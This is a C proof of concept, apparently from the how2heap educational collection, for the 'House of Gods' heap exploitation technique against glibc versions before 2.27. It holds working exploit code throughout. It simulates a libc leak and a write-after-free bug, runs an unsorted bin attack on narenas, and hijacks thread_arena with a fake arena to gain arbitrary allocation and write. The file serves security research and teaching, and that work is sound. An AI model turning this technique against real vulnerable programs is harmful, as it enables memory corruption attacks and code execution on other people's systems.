/* House of Gods PoC */
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <inttypes.h>
/*
 * Welcome to the House of Gods...
 *
 * House of Gods is an arena hijacking technique for glibc < 2.27. It supplies
 * the attacker with an arbitrary write against the thread_arena symbol of
 * the main thread. This can be used to replace the main_arena with a
 * carefully crafted fake arena. The exploit was tested against
 *
 *     - glibc-2.23
 *     - glibc-2.24
 *     - glibc-2.25
 *     - glibc-2.26
 *
 * Following requirements are mandatory
 *
 *     - 8 allocs of arbitrary size to hijack the arena (+2 for ACE)
 *     - control over first 5 quadwords of a chunk's userdata
 *     - a single write-after-free bug on an unsorted chunk
 *     - heap address leak + libc address leak
 *
 * This PoC demonstrates how to leverage the House of Gods in order to hijack
 * the thread_arena. But it wont explain how to escalate further to
 * arbitrary code execution, since this step is trivial once the whole arena
 * is under control.
 *
 * Also note, that the how2heap PoC might use more allocations than
 * previously stated. This is intentional and has educational purposes.
 *
 * If you want to read the full technical description of this technique, going
 * from zero to arbitrary code execution within only 10 to 11 allocations, here
 * is the original document I've written
 *
 *     https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT
 *
 * I recommend reading this document while experimenting with
 * the how2heap PoC.
 *
 * Besides that, this technique abuses a minor bug in glibc, which I have
 * already submitted to bugzilla at
 *
 *     https://sourceware.org/bugzilla/show_bug.cgi?id=29709
 *
 * AUTHOR: David Milosevic (milo)
 *
 * */
 /* <--- Exploit PoC ---> */
int main(void)
{
    /*
     * allocate a smallchunk, for example a 0x90-chunk.
     * */
    void *SMALLCHUNK = malloc(0x88);
    /*
     * allocate the first fastchunk. We will use
     * a 0x20-chunk for this purpose.
     * */
    void *FAST20 = malloc(0x18);
    /*
     * allocate a second fastchunk. This time
     * a 0x40-chunk.
     * */
    void *FAST40 = malloc(0x38);
    /*
     * put SMALLCHUNK into the unsorted bin.
     * */
    free(SMALLCHUNK);
    /*
     * this is a great opportunity to simulate a
     * libc leak. We just read the address of the
     * unsorted bin and save it for later.
     * */
    const uint64_t leak = *((uint64_t *)SMALLCHUNK);
    /*
     * following allocation will trigger a binning
     * process within the unsorted bin and move
     * SMALLCHUNK to the 0x90-smallbin.
     * */
    void *INTM = malloc(0x98);
    /*
     * recycle our previously binned smallchunk.
     * Note that, it is not neccessary to recycle this
     * chunk. I am doing it only to keep the heap layout
     * small and compact.
     * */
    SMALLCHUNK = malloc(0x88);
    /*
     * put SMALLCHUNK into the unsorted bin.
     * */
    free(SMALLCHUNK);
    /*
     * bug: a single write-after-free bug on an
     * unsorted chunk is enough to initiate the
     * House of Gods technique.
     * */
    *((uint64_t *)(SMALLCHUNK + 0x8)) = leak + 0x7f8;
    /*
     * before free'ing those chunks, let us write
     * the address of another chunk to the currently
     * unused bk pointer of FAST40. We can reuse
     * the previously requested INTM chunk for that.
     *
     * Free'ing FAST40 wont reset the bk pointer, thus
     * we can let it point to an allocated chunk while
     * having it stored in one of the fastbins.
     *
     * The reason behind this, is the simple fact that
     * we will need to perform an unsorted bin attack later.
     * And we can not request a 0x40-chunk to trigger the
     * partial unlinking, since a 0x40 request will be serviced
     * from the fastbins instead of the unsorted bin.
     * */
    *((uint64_t *)(FAST40 + 0x8)) = (uint64_t)(INTM - 0x10);
    /*
     * and now free the 0x20-chunk in order to forge a sizefield.
     * */
    free(FAST20);
    /*
     * and the 0x40-chunk in order to forge a bk pointer.
     * */
    free(FAST40);
    /*
     * all the hard work finally pays off...we can
     * now allocate the binmap-chunk from the unsorted bin.
     * */
    void *BINMAP = malloc(0x1f8);
    /*
     * set INTM's bk to narenas-0x10. This will
     * be our target for the unsorted bin attack.
     * */
    *((uint64_t *)(INTM + 0x8)) = leak - 0xa40;
    /*
     * this way we can abuse a heap pointer
     * as a valid sizefield.
     * */
    *((uint64_t *)(BINMAP + 0x20)) = 0xffffffffffffffff;
    /*
     * request the INTM chunk from the unsorted bin
     * in order to trigger a partial unlinking between
     * head and narenas-0x10.
     * */
    INTM = malloc(0x98);
    /*
     * set main_arena.next to an arbitrary address. The
     * next two calls to malloc will overwrite thread_arena
     * with the same address. I'll reuse INTM as fake arena.
     *
     * Note, that INTM is not suitable as fake arena but
     * nevertheless, it is an easy way to demonstrate that
     * we are able to set thread_arena to an arbitrary address.
     * */
    *((uint64_t *)(BINMAP + 0x8)) = (uint64_t)(INTM - 0x10);
    /*
     * the first call will force the reused_arena()
     * function to set thread_arena to the address of
     * the current main-arena.
     * */
    malloc(0xffffffffffffffbf + 1);
    /*
     * the second call will force the reused_arena()
     * function to set thread_arena to the address stored
     * in main_arena.next - our fake arena.
     * */
    malloc(0xffffffffffffffbf + 1);
    /*
     * construct a 0x70-fakechunk on the stack...
     * */
    uint64_t fakechunk[4] = {
        0x0000000000000000, 0x0000000000000073,
        0x4141414141414141, 0x0000000000000000
    };
    /*
     * ...and place it in the 0x70-fastbin of our fake arena
     * */
    *((uint64_t *)(INTM + 0x20)) = (uint64_t)(fakechunk);
    /*
     * use the fake arena to perform arbitrary allocations
     * */
    void *FAKECHUNK = malloc(0x68);
    /*
     * overwriting the target data
     * */
    *((uint64_t *)(FAKECHUNK)) = 0x4242424242424242;
    /*
     * confirm success
     * */
    assert(fakechunk[2] == 0x4242424242424242);
    return EXIT_SUCCESS;
}
